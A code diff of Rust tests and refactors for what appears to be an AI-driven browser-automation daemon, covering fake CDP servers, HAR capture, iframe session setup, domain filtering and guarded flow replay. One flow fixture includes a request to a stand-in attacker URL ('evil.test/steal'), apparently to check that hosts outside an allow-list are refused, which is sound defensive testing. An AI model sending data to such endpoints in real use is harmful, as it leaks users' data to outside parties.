-fn primary_button_from_mask(buttons: i32) -> &'static str {
-    if buttons & 1 != 0 {
-        "left"
-    } else if buttons & 2 != 0 {
-        "right"
-    } else if buttons & 4 != 0 {
-        "middle"
-    } else if buttons & 8 != 0 {
-        "back"
-    } else if buttons & 16 != 0 {
-        "forward"
-    } else {
-        "none"
-    }
-}
-
 #[allow(clippy::too_many_arguments)]
 fn build_mouse_event_params(
     mouse_state: &mut MouseState,
@@ -14483,10 +15000,12 @@ fn build_mouse_event_params(
     if buttons.is_none() {
         match event_type {
             "mousePressed" => {
-                next_buttons |= mouse_button_mask(button.unwrap_or("left"));
+                next_buttons |=
+                    MouseButton::parse(button.unwrap_or("left")).map_or(0, MouseButton::mask);
             }
             "mouseReleased" => {
-                next_buttons &= !mouse_button_mask(button.unwrap_or("left"));
+                next_buttons &=
+                    !MouseButton::parse(button.unwrap_or("left")).map_or(0, MouseButton::mask);
             }
             _ => {}
         }
@@ -14499,7 +15018,7 @@ fn build_mouse_event_params(
         y,
         button: Some(
             button
-                .unwrap_or(primary_button_from_mask(next_buttons))
+                .unwrap_or(MouseButton::primary(next_buttons).map_or("none", MouseButton::name))
                 .to_string(),
         ),
         buttons: Some(next_buttons),
@@ -15055,6 +15574,67 @@ fn attach_tab_gone_data(resp: &mut Value, state: &DaemonState) {
 
 #[cfg(test)]
 mod tests {
+    /// Serves `Browser.getVersion` on one fixed `ws://` address for any number
+    /// of connections and counts the calls.
+    async fn version_server() -> (String, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
+        use futures_util::{SinkExt, StreamExt};
+        use tokio_tungstenite::tungstenite::Message;
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let url = format!("ws://{}", listener.local_addr().unwrap());
+        let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+        let served = calls.clone();
+        tokio::spawn(async move {
+            while let Ok((stream, _)) = listener.accept().await {
+                let calls = served.clone();
+                tokio::spawn(async move {
+                    let Ok(mut ws) = tokio_tungstenite::accept_async(stream).await else {
+                        return;
+                    };
+                    while let Some(Ok(Message::Text(text))) = ws.next().await {
+                        let request: serde_json::Value = serde_json::from_str(&text).unwrap();
+                        if request["method"] == "Browser.getVersion" {
+                            calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+                        }
+                        let reply = serde_json::json!({
+                            "id": request["id"],
+                            "result": { "product": "Chrome/1.0.0.0" },
+                        });
+                        if ws
+                            .send(Message::Text(reply.to_string().into()))
+                            .await
+                            .is_err()
+                        {
+                            return;
+                        }
+                    }
+                });
+            }
+        });
+        (url, calls)
+    }
+
+    #[tokio::test]
+    async fn outdated_check_reads_the_product_once_per_connection() {
+        let (url, calls) = version_server().await;
+        let mut state = super::DaemonState::new();
+        let mut response = serde_json::json!({});
+
+        let client = crate::native::cdp::client::CdpClient::connect(&url)
+            .await
+            .unwrap();
+        state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
+        super::warn_if_browser_outdated(&mut state, &mut response).await;
+        super::warn_if_browser_outdated(&mut state, &mut response).await;
+        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
+
+        let client = crate::native::cdp::client::CdpClient::connect(&url)
+            .await
+            .unwrap();
+        state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
+        super::warn_if_browser_outdated(&mut state, &mut response).await;
+        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
+    }
+
     #[tokio::test]
     async fn cdp_url_without_browser_does_not_launch() {
         let mut state = super::DaemonState::new();
@@ -15070,6 +15650,68 @@ mod tests {
         assert_eq!(response["success"], false);
         assert_eq!(response["error"], "Browser not launched");
         assert!(state.browser.is_none());
+    }
+
+    #[tokio::test]
+    async fn a_replay_over_a_har_without_content_captures_bodies_and_restores_the_mode() {
+        use crate::native::flow::Browser;
+        let mut state = DaemonState::new();
+        state.har_recording = true;
+        state.har_content_mode = HarContentMode::None;
+        let allow = crate::native::flow::AllowWrite::default();
+        let mut wiring = FlowWiring::new(&mut state, &allow);
+        wiring.begin_capture().await.unwrap();
+        assert_eq!(
+            wiring.state.har_content_mode,
+            HarContentMode::Text,
+            "the replay needs bodies to read its answers"
+        );
+        wiring.end_capture().await;
+        assert_eq!(state.har_content_mode, HarContentMode::None);
+        assert!(state.har_recording, "the user's HAR keeps running");
+    }
+
+    #[tokio::test]
+    async fn a_replay_leaves_no_bodies_on_the_entries_a_content_none_har_held_before_it() {
+        use crate::native::flow::Browser;
+        let entry = |id: &str, body: Option<&str>| HarEntry {
+            request_id: id.to_string(),
+            wall_time: 0.0,
+            method: "GET".to_string(),
+            url: "https://example.com/".to_string(),
+            request_headers: Vec::new(),
+            post_data: None,
+            request_body_size: 0,
+            resource_type: "Fetch".to_string(),
+            status: Some(200),
+            status_text: "OK".to_string(),
+            http_version: "HTTP/2.0".to_string(),
+            response_headers: Vec::new(),
+            mime_type: "application/json".to_string(),
+            redirect_url: String::new(),
+            response_body_size: 2,
+            cdp_timing: None,
+            loading_finished_timestamp: Some(1.0),
+            response_body: body.map(String::from),
+            response_body_base64: false,
+            remote_addr: None,
+        };
+        let mut state = DaemonState::new();
+        state.har_recording = true;
+        state.har_content_mode = HarContentMode::None;
+        state.har_entries.push(entry("before", None));
+        let allow = crate::native::flow::AllowWrite::default();
+        let mut wiring = FlowWiring::new(&mut state, &allow);
+        let mark = wiring.begin_capture().await.unwrap();
+        // A body fetched while the replay ran, for a request that began earlier.
+        wiring.state.har_entries[0].response_body = Some("{}".to_string());
+        wiring.state.har_body_total_bytes = 2;
+        wiring.state.har_entries.push(entry("during", Some("{}")));
+        assert_eq!(mark, 1);
+        wiring.end_capture().await;
+        assert_eq!(state.har_entries.len(), 1);
+        assert_eq!(state.har_entries[0].response_body, None);
+        assert_eq!(state.har_body_total_bytes, 0);
     }
 
     #[test]
@@ -16210,6 +16852,126 @@ mod tests {
         ))
     }
 
+    #[tokio::test]
+    async fn direct_page_events_reach_debug_and_webmcp_consumers() {
+        use super::native_tracing::{
+            profiler_start, profiler_stop, trace_start, trace_stop, TracingState,
+        };
+        use futures_util::{SinkExt, StreamExt};
+        use tokio_tungstenite::tungstenite::Message;
+
+        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let url = format!("ws://{}", listener.local_addr().unwrap());
+        let server = tokio::spawn(async move {
+            let (stream, _) = listener.accept().await.unwrap();
+            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
+            let mut stream_mode = false;
+            while let Some(Ok(Message::Text(text))) = ws.next().await {
+                let cmd: Value = serde_json::from_str(&text).unwrap();
+                let events = match cmd["method"].as_str().unwrap() {
+                    "Runtime.evaluate" if cmd["params"]["expression"].is_string() => vec![
+                        json!({"method":"Page.javascriptDialogOpening", "params":{"url":"https://page.test/", "type":"confirm", "message":"pending"}}),
+                    ],
+                    "Runtime.evaluate" => vec![
+                        json!({"sessionId":"other", "method":"Runtime.consoleAPICalled", "params":{"args":[{"type":"string", "value":"wrong page"}]}}),
+                        json!({"method":"Runtime.consoleAPICalled", "params":{"args":[{"type":"string", "value":"from the page"}]}}),
+                        json!({"method":"Network.requestWillBeSent", "params":{"requestId":"r1", "request":{"url":"https://page.test/"}}}),
+                        json!({"method":"WebMCP.toolsAdded", "params":{"tools":[{"name":"search", "frameId":"frame"}]}}),
+                    ],
+                    "Runtime.releaseObject" => vec![
+                        json!({"method":"WebMCP.toolsRemoved", "params":{"tools":[{"name":"search", "frameId":"frame"}]}}),
+                    ],
+                    "Tracing.start" => {
+                        stream_mode = cmd["params"]["transferMode"] == "ReturnAsStream";
+                        vec![]
+                    }
+                    "Tracing.end" if stream_mode => vec![
+                        json!({"sessionId":"other", "method":"Tracing.tracingComplete", "params":{}}),
+                        json!({"method":"Tracing.tracingComplete", "params":{"stream":"trace"}}),
+                    ],
+                    "Tracing.end" => vec![
+                        json!({"sessionId":"other", "method":"Tracing.tracingComplete", "params":{}}),
+                        json!({"method":"Tracing.dataCollected", "params":{"value":[{"name":"marker"}]}}),
+                        json!({"method":"Tracing.tracingComplete", "params":{}}),
+                    ],
+                    _ => vec![],
+                };
+                let result = if cmd["method"] == "IO.read" {
+                    json!({"data":"{\"traceEvents\":[{\"name\":\"marker\"}]}", "eof":true})
+                } else {
+                    json!({})
+                };
+                let response = json!({"id":cmd["id"], "result":result});
+                for event in events.into_iter().chain([response]) {
+                    ws.send(event.to_string().into()).await.unwrap();
+                }
+            }
+        });
+        let mut state = DaemonState::new();
+        state.browser = Some(BrowserManager::connect_cdp_direct(&url).await.unwrap());
+        let client = state.browser.as_ref().unwrap().client.clone();
+        state.subscribe_to_browser_events();
+        state.har_recording = true;
+        state.request_tracking = true;
+        let (add, remove) = ("Runtime.evaluate", "Runtime.releaseObject");
+        client.send_command_no_params(add, None).await.unwrap();
+        state.drain_cdp_events();
+        assert_eq!(state.event_tracker.console_entries.len(), 1);
+        assert_eq!(state.event_tracker.console_entries[0].text, "from the page");
+        assert_eq!(state.tracked_requests.len(), 1);
+        assert_eq!(state.har_entries.len(), 1);
+        assert_eq!(state.webmcp.tools("").unwrap()[0].name, "search");
+        client.send_command_no_params(remove, None).await.unwrap();
+        state.drain_cdp_events();
+        assert!(state.webmcp.tools("").unwrap().is_empty());
+
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("trace.json");
+        let path_str = path.to_str();
+        tokio::time::timeout(std::time::Duration::from_secs(3), async {
+            let mut trace = TracingState::new();
+            for profile in [false, true] {
+                if profile {
+                    profiler_start(&client, "", &mut trace, None).await.unwrap();
+                    profiler_stop(&client, "", &mut trace, path_str)
+                        .await
+                        .unwrap();
+                } else {
+                    trace_start(&client, "", &mut trace).await.unwrap();
+                    trace_stop(&client, "", &mut trace, path_str).await.unwrap();
+                }
+                let saved: Value = serde_json::from_slice(&fs::read(&path).unwrap()).unwrap();
+                assert_eq!(saved["traceEvents"], json!([{"name":"marker"}]));
+            }
+        })
+        .await
+        .unwrap();
+
+        client
+            .send_command(
+                "Runtime.evaluate",
+                Some(json!({"expression":"setTimeout(() => confirm('pending'), 0)"})),
+                None,
+            )
+            .await
+            .unwrap();
+        state.drain_cdp_events();
+        assert_eq!(
+            handle_dialog(&json!({"response":"status"}), &mut state)
+                .await
+                .unwrap(),
+            json!({"hasDialog":true, "type":"confirm", "message":"pending"})
+        );
+        close_current_browser(&mut state).await.unwrap();
+        assert_eq!(
+            handle_dialog(&json!({"response":"status"}), &mut state)
+                .await
+                .unwrap(),
+            json!({"hasDialog":false})
+        );
+        server.abort();
+    }
+
     #[test]
     fn test_iframe_network_events_are_scoped_to_active_page_sessions() {
         let active_sessions = HashSet::from(["active-iframe".to_string()]);
@@ -16350,6 +17112,402 @@ mod tests {
         assert!(drained.attached_page_sessions.is_empty());
         assert_eq!(drained.new_targets.len(), 1);
         assert_eq!(drained.new_targets[0].target_info.target_id, "p");
+    }
+
+    /// An iframe that detaches while its session is being prepared is
+    /// dropped without waiting out the CDP timeout and without closing the
+    /// browser, even with network controls active (#1991). Frames that were
+    /// already attached, and ones attached in the same batch, are kept.
+    #[tokio::test]
+    async fn iframe_detached_during_setup_is_dropped_without_stalling() {
+        use futures_util::{SinkExt, StreamExt};
+        use tokio_tungstenite::tungstenite::Message;
+
+        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let url = format!("ws://{}", listener.local_addr().unwrap());
+        let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+        let resumed_by_server = resumed.clone();
+        tokio::spawn(async move {
+            let (stream, _) = listener.accept().await.unwrap();
+            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
+            while let Some(Ok(Message::Text(text))) = ws.next().await {
+                let command: Value = serde_json::from_str(&text).unwrap();
+                let session = command["sessionId"].as_str().unwrap_or_default();
+                if command["method"] == "Runtime.runIfWaitingForDebugger" {
+                    resumed_by_server.lock().unwrap().push(session.to_string());
+                    continue;
+                }
+                // The short-lived frame is gone before Chrome answers.
+                let reply = if session == "S-GONE" {
+                    json!({
+                        "method": "Target.detachedFromTarget",
+                        "params": { "sessionId": "S-GONE", "targetId": "F-GONE" }
+                    })
+                } else {
+                    json!({ "id": command["id"], "result": {} })
+                };
+                if ws.send(Message::Text(reply.to_string())).await.is_err() {
+                    return;
+                }
+            }
+        });
+
+        let mut state = DaemonState::new();
+        let client = CdpClient::connect(&url).await.unwrap();
+        state.browser = Some(BrowserManager::for_test(client, url.clone()));
+        *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));
+        state
+            .iframe_sessions
+            .insert("F-PAY".to_string(), "S-PAY".to_string());
+
+        let drained = DrainedEvents {
+            attached_iframe_sessions: vec![
+                ("F-GONE".to_string(), "S-GONE".to_string()),
+                ("F-NEW".to_string(), "S-NEW".to_string()),
+            ],
+            ..DrainedEvents::default()
+        };
+        tokio::time::timeout(
+            std::time::Duration::from_secs(2),
+            state.apply_drained_events(drained),
+        )
+        .await
+        .expect("a detached iframe must not hold up the drain")
+        .unwrap();
+
+        assert!(state.browser.is_some(), "the browser must stay open");
+        assert_eq!(
+            state.iframe_sessions,
+            HashMap::from([
+                ("F-PAY".to_string(), "S-PAY".to_string()),
+                ("F-NEW".to_string(), "S-NEW".to_string()),
+            ])
+        );
+        tokio::time::timeout(std::time::Duration::from_secs(2), async {
+            while !resumed.lock().unwrap().contains(&"S-NEW".to_string()) {
+                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+            }
+        })
+        .await
+        .expect("the live frame should be resumed");
+        assert!(!resumed.lock().unwrap().contains(&"S-GONE".to_string()));
+    }
+
+    fn setup_test_target(target_id: &str, target_type: &str) -> TargetInfo {
+        TargetInfo {
+            target_id: target_id.to_string(),
+            target_type: target_type.to_string(),
+            title: String::new(),
+            url: "https://example.com/".to_string(),
+            attached: Some(true),
+            browser_context_id: None,
+        }
+    }
+
+    /// Fake CDP endpoint for the session setup tests. `Target.attachToTarget`
+    /// attaches `attach_sid`. Commands to `S-GONE` are answered with that
+    /// session's detach, commands to `S-SILENT` are never answered,
+    /// `Runtime.evaluate` in `S-THROWS` reports an exception whose text names
+    /// a missing session, and everything else succeeds. Returns the URL and
+    /// the sessions resumed.
+    async fn spawn_session_setup_cdp_server(
+        attach_sid: &'static str,
+    ) -> (String, Arc<std::sync::Mutex<Vec<String>>>) {
+        use futures_util::{SinkExt, StreamExt};
+        use tokio_tungstenite::tungstenite::Message;
+
+        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let url = format!("ws://{}", listener.local_addr().unwrap());
+        let resumed = Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
+        let resumed_by_server = resumed.clone();
+        tokio::spawn(async move {
+            let (stream, _) = listener.accept().await.unwrap();
+            let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
+            while let Some(Ok(Message::Text(text))) = ws.next().await {
+                let command: Value = serde_json::from_str(&text).unwrap();
+                let session = command["sessionId"].as_str().unwrap_or_default();
+                if command["method"] == "Runtime.runIfWaitingForDebugger" {
+                    resumed_by_server.lock().unwrap().push(session.to_string());
+                    continue;
+                }
+                let reply = match session {
+                    "S-SILENT" => continue,
+                    "S-THROWS" if command["method"] == "Runtime.evaluate" => json!({
+                        "id": command["id"],
+                        "result": {
+                            "result": { "type": "object", "subtype": "error" },
+                            "exceptionDetails": {
+                                "text": "Uncaught",
+                                "exception": {
+                                    "type": "object",
+                                    "subtype": "error",
+                                    "description": "Error: Session with given id not found."
+                                }
+                            }
+                        }
+                    }),
+                    "S-GONE" => json!({
+                        "method": "Target.detachedFromTarget",
+                        "params": { "sessionId": "S-GONE", "targetId": "T-GONE" }
+                    }),
+                    _ if command["method"] == "Target.attachToTarget" => json!({
+                        "id": command["id"],
+                        "result": { "sessionId": attach_sid }
+                    }),
+                    _ => json!({ "id": command["id"], "result": {} }),
+                };
+                if ws.send(Message::Text(reply.to_string())).await.is_err() {
+                    return;
+                }
+            }
+        });
+        (url, resumed)
+    }
+
+    /// A popup page or worker that detaches while the drain prepares it is
+    /// dropped without closing the browser, even though network controls are
+    /// active. Covers every page and worker path of the drain.
+    #[tokio::test]
+    async fn page_or_worker_detached_during_setup_keeps_the_browser_open() {
+        let cases: Vec<(&str, DrainedEvents)> = vec![
+            (
+                "attached page",
+                DrainedEvents {
+                    attached_page_sessions: vec![(
+                        setup_test_target("T-GONE", "page"),
+                        "S-GONE".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+            (
+                "discovered page",
+                DrainedEvents {
+                    new_targets: vec![TargetCreatedEvent {
+                        target_info: setup_test_target("T-GONE", "page"),
+                    }],
+                    ..DrainedEvents::default()
+                },
+            ),
+            (
+                "worker",
+                DrainedEvents {
+                    attached_worker_sessions: vec![(
+                        setup_test_target("T-GONE", "service_worker"),
+                        "S-GONE".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+        ];
+
+        for (name, drained) in cases {
+            let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
+            let mut state = DaemonState::new();
+            let client = CdpClient::connect(&url).await.unwrap();
+            state.browser = Some(BrowserManager::for_test(client, url.clone()));
+            *state.proxy_credentials.write().await = Some(("user".into(), "pass".into()));
+
+            let result = tokio::time::timeout(
+                std::time::Duration::from_secs(2),
+                state.apply_drained_events(drained),
+            )
+            .await
+            .unwrap_or_else(|_| panic!("{name}: a detached session must not hold up the drain"));
+
+            assert_eq!(result, Ok(()), "{name}");
+            assert!(
+                state.browser.is_some(),
+                "{name}: the browser must stay open"
+            );
+            assert!(
+                !resumed.lock().unwrap().contains(&"S-GONE".to_string()),
+                "{name}: a detached session is not resumed"
+            );
+        }
+    }
+
+    /// Every child session the drain prepares is bounded, so one that never
+    /// answers and never reports a detach holds the drain (and with it every
+    /// queued command) for the setup bound, not the 30 s CDP timeout of each
+    /// command it sends.
+    #[tokio::test]
+    async fn silent_session_setup_is_bounded() {
+        let cases: Vec<(&str, DrainedEvents)> = vec![
+            (
+                "iframe",
+                DrainedEvents {
+                    attached_iframe_sessions: vec![(
+                        "F-SILENT".to_string(),
+                        "S-SILENT".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+            (
+                "attached page",
+                DrainedEvents {
+                    attached_page_sessions: vec![(
+                        setup_test_target("T-SILENT", "page"),
+                        "S-SILENT".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+            (
+                "discovered page",
+                DrainedEvents {
+                    new_targets: vec![TargetCreatedEvent {
+                        target_info: setup_test_target("T-SILENT", "page"),
+                    }],
+                    ..DrainedEvents::default()
+                },
+            ),
+        ];
+
+        for (name, drained) in cases {
+            let (url, _) = spawn_session_setup_cdp_server("S-SILENT").await;
+            let mut state = DaemonState::new();
+            let client = CdpClient::connect(&url).await.unwrap();
+            state.browser = Some(BrowserManager::for_test(client, url.clone()));
+
+            // Virtual time: the clock jumps to the next timer once the
+            // runtime is idle, so the bound fires without a 10 s wait.
+            tokio::time::pause();
+            let started = tokio::time::Instant::now();
+            let result = tokio::time::timeout(
+                AUTO_ATTACHED_SETUP_TIMEOUT * 2,
+                state.apply_drained_events(drained),
+            )
+            .await
+            .unwrap_or_else(|_| panic!("{name}: setup must give up at the setup bound"));
+            let elapsed = started.elapsed();
+            tokio::time::resume();
+
+            // Without network controls a failed setup is only a warning.
+            assert_eq!(result, Ok(()), "{name}");
+            assert!(state.browser.is_some(), "{name}");
+            assert!(
+                elapsed >= AUTO_ATTACHED_SETUP_TIMEOUT,
+                "{name}: gave up after {elapsed:?}"
+            );
+        }
+    }
+
+    /// The background handler drops a session that detaches while it
+    /// installs network controls, and resumes the ones that stay attached.
+    #[tokio::test]
+    async fn background_auto_attach_drops_sessions_detached_during_setup() {
+        let (url, resumed) = spawn_session_setup_cdp_server("S-GONE").await;
+        let client = CdpClient::connect(&url).await.unwrap();
+
+        for target_type in ["iframe", "page", "service_worker"] {
+            for (sid, target_id, expected) in [
+                ("S-LIVE", "T-LIVE", AutoAttachedSetup::Resumed),
+                ("S-GONE", "T-GONE", AutoAttachedSetup::Detached),
+            ] {
+                let target = setup_test_target(target_id, target_type);
+                let outcome = tokio::time::timeout(
+                    std::time::Duration::from_secs(2),
+                    setup_auto_attached_session(&client, sid, Some(&target), true, None, true),
+                )
+                .await
+                .unwrap_or_else(|_| panic!("{target_type} {sid}: setup must not stall"));
+                assert_eq!(outcome, expected, "{target_type} {sid}");
+            }
+        }
+
+        tokio::time::timeout(std::time::Duration::from_secs(2), async {
+            while resumed.lock().unwrap().len() < 3 {
+                tokio::time::sleep(std::time::Duration::from_millis(10)).await;
+            }
+        })
+        .await
+        .expect("each live session should be resumed");
+        let resumed = resumed.lock().unwrap();
+        assert!(resumed.iter().all(|sid| sid == "S-LIVE"), "{resumed:?}");
+    }
+
+    /// A live frame or page can throw from the injected domain filter with
+    /// any message, including Chrome's text for a missing session. That is a
+    /// failure to install the filter, not a detach, so the browser still
+    /// closes instead of leaving the target running without its controls.
+    #[tokio::test]
+    async fn page_thrown_detach_text_still_fails_network_controls_closed() {
+        let cases: Vec<(&str, DrainedEvents)> = vec![
+            (
+                "iframe",
+                DrainedEvents {
+                    attached_iframe_sessions: vec![(
+                        "F-THROWS".to_string(),
+                        "S-THROWS".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+            (
+                "attached page",
+                DrainedEvents {
+                    attached_page_sessions: vec![(
+                        setup_test_target("T-THROWS", "page"),
+                        "S-THROWS".to_string(),
+                    )],
+                    ..DrainedEvents::default()
+                },
+            ),
+        ];
+
+        for (name, drained) in cases {
+            let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
+            let mut state = DaemonState::new();
+            let client = CdpClient::connect(&url).await.unwrap();
+            state.browser = Some(BrowserManager::for_test(client, url.clone()));
+            *state.domain_filter.write().await = Some(DomainFilter::new("example.com"));
+
+            let result = tokio::time::timeout(
+                std::time::Duration::from_secs(2),
+                state.apply_drained_events(drained),
+            )
+            .await
+            .unwrap_or_else(|_| panic!("{name}: setup must not stall"));
+
+            let error = result.expect_err(name);
+            assert!(
+                error.starts_with("Failed to install browser network controls"),
+                "{name}: {error}"
+            );
+            assert!(state.browser.is_none(), "{name}: the browser must close");
+            assert!(
+                !resumed.lock().unwrap().contains(&"S-THROWS".to_string()),
+                "{name}: an uncontrolled target is not resumed"
+            );
+        }
+
+        let (url, resumed) = spawn_session_setup_cdp_server("S-THROWS").await;
+        let client = CdpClient::connect(&url).await.unwrap();
+        let filter = DomainFilter::new("example.com");
+        for target_type in ["iframe", "page"] {
+            let target = setup_test_target("T-THROWS", target_type);
+            let outcome = tokio::time::timeout(
+                std::time::Duration::from_secs(2),
+                setup_auto_attached_session(
+                    &client,
+                    "S-THROWS",
+                    Some(&target),
+                    false,
+                    Some(&filter),
+                    false,
+                ),
+            )
+            .await
+            .unwrap_or_else(|_| panic!("auto-attached {target_type}: setup must not stall"));
+            assert_eq!(
+                outcome,
+                AutoAttachedSetup::Failed,
+                "auto-attached {target_type}"
+            );
+        }
+        assert!(resumed.lock().unwrap().is_empty());
     }
 
     #[test]
@@ -18642,9 +19800,8 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"data":{}}'
         let guard = EnvGuard::new(&["AGENT_BROWSER_ALLOWED_DOMAINS"]);
         guard.set("AGENT_BROWSER_ALLOWED_DOMAINS", " , ");
         let state = DaemonState::new();
-        let filter = state.domain_filter.try_read().unwrap();
-        let filter = filter.as_ref().expect("domain filter");
-        assert!(filter.is_allowed("any.test"));
+        // No filter at all, so direct-page providers are not refused either.
+        assert!(state.domain_filter.try_read().unwrap().is_none());
     }
 
     #[test]
@@ -19442,6 +20599,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: None,
             response_body_base64: false,
+            remote_addr: None,
         };
 
         let har = har_entry_to_json(&entry);
@@ -19492,6 +20650,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: Some(r#"{"items":[1]}"#.to_string()),
             response_body_base64: false,
+            remote_addr: None,
         };
 
         let har = har_entry_to_json(&entry);
@@ -19588,6 +20747,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: None,
             response_body_base64: false,
+            remote_addr: None,
         };
         let har = har_entry_to_json(&entry);
         assert_eq!(har["response"]["cookies"][0]["name"], "token");
@@ -19645,6 +20805,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             loading_finished_timestamp: None,
             response_body: None,
             response_body_base64: false,
+            remote_addr: None,
         });
 
         let result = handle_har_stop(&json!({ "action": "har_stop" }), &mut state)
@@ -19688,7 +20849,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "version": 1, "name": "edited", "origin": "example.com",
             "startUrl": "https://example.com/", "allowedHosts": ["example.com"],
             "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
-            "steps": [{ "seq": 1, "requests": [{
+            "steps": [{ "seq": 1, "ok": true, "command": { "action": "navigate" }, "requests": [{
                 "id": "s1r1", "method": "GET", "url": "https://evil.test/steal",
                 "headers": {}, "body": null,
                 "expect": { "status": 200, "mime": "application/json", "signature": {}, "bytes": 2, "itemFields": [], "extract": null }
@@ -19722,7 +20883,7 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
             "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
             "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
-            "steps": [{ "seq": 1, "requests": [{
+            "steps": [{ "seq": 1, "ok": true, "command": { "action": "click" }, "requests": [{
                 "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
                 "expect": { "status": 200, "mime": "application/json",
                     "signature": super::super::flow::signature(&json!({ "ok": true })),
@@ -19866,11 +21027,41 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
             assert_eq!(resp["success"], false, "{resp}");
             assert!(resp["error"].as_str().unwrap().contains(expect), "{resp}");
             assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
-            assert!(state.browser.is_none());
+            assert!(state.browser.is_none(), "no lower tier ran");
             if response.is_empty() {
                 assert_eq!(resp["code"], "outcome_unknown");
             }
         }
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn a_flow_file_that_cannot_be_saved_does_not_hide_an_applied_write() {
+        use std::os::unix::fs::PermissionsExt;
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        // The site takes the write and answers with another shape.
+        let (port, hits) = serve_counting("HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 13\r\nconnection: close\r\n\r\n{\"cart\":[7]}\n");
+        write_flow_fixture(dir.path(), port);
+        let origin_dir = dir.path().join("127.0.0.1");
+        let file = origin_dir.join("cart.json");
+        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o400)).unwrap();
+        std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o500)).unwrap();
+        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
+        let mut state = DaemonState::new();
+        state.policy = None;
+        state.confirm_actions = None;
+        let resp = execute_command(&run, &mut state).await;
+        std::fs::set_permissions(&origin_dir, std::fs::Permissions::from_mode(0o700)).unwrap();
+        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
+        assert_eq!(resp["success"], false, "{resp}");
+        assert_eq!(resp["code"], "write_applied", "{resp}");
+        let error = resp["error"].as_str().unwrap();
+        assert!(error.contains("do not repeat it"), "{resp}");
+        assert!(error.contains("the flow file was not updated"), "{resp}");
+        assert!(resp["data"]["saveError"].is_string(), "{resp}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
     }
 
     #[tokio::test]
@@ -19927,6 +21118,175 @@ printf '%s' '{"protocol":"agent-browser.plugin.v1","success":true,"browser":{"cd
         assert_eq!(resp["success"], false, "{resp}");
         assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
         assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn the_replay_does_not_send_a_write_that_was_not_allowed() {
+        let dir = tempfile::tempdir().unwrap();
+        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
+        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
+        let flow = json!({
+            "version": 1, "name": "buy", "origin": "127.0.0.1",
+            "startUrl": "http://127.0.0.1:9/", "allowedHosts": ["127.0.0.1"],
+            "params": [], "output": "s2r1", "itemFields": [], "verifiedAt": null,
+            "writes": [{ "id": "s1w1", "method": "POST", "url": "http://127.0.0.1:9/buy", "kind": "explicit", "step": 1 }],
+            "steps": [
+                { "seq": 1, "ok": true, "command": { "action": "click", "selector": "#buy" }, "requests": [] },
+                { "seq": 2, "ok": true, "command": { "action": "click", "selector": "#list" }, "requests": [{
+                    "id": "s2r1", "method": "GET", "url": "http://127.0.0.1:9/items", "headers": {}, "body": null, "tier": "replay",
+                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "items": [] })), "bytes": 12, "itemFields": [], "extract": null }
+                }] }
+            ]
+        });
